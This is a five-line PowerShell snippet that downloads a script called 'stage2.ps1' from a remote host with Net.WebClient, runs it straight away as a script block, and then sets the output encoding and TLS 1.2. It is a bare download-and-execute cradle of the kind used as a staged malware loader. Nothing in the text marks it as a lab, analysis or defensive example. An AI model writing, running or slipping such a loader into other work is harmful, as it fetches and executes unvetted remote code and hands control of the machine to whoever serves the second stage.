$TargetUrl = "https://internal.corp/stage2.ps1"
$ScriptText = (New-Object Net.WebClient).DownloadString($TargetUrl)
& ([ScriptBlock]::Create($ScriptText))
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
